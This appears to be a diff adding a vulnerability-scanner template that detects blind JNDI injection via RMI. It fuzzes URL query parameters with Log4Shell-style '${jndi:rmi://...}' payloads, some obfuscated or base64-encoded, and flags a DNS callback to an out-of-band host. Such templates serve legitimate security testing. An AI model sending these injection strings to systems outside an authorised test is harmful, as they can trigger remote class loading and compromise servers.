@@ -1,0 +1,33 @@
+id: blind-jndi-via-rmi
+
+info:
+  name: Blind JNDI via RMI Detection
+  author: reewardius
+  severity: high
+  tags: blind,fuzzing
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    
+    payloads:
+      jndi:
+        - "${jndi:rmi://{{interactsh-url}}"
+        - "${lower:r}m${lower:i}://{{interactsh-url}}/abc"
+        - "{{base64('${jndi:rmi://{{interactsh-url}}')}}"
+        - "{{base64('rmi://{{interactsh-url}}')}}"
+        
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{jndi}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
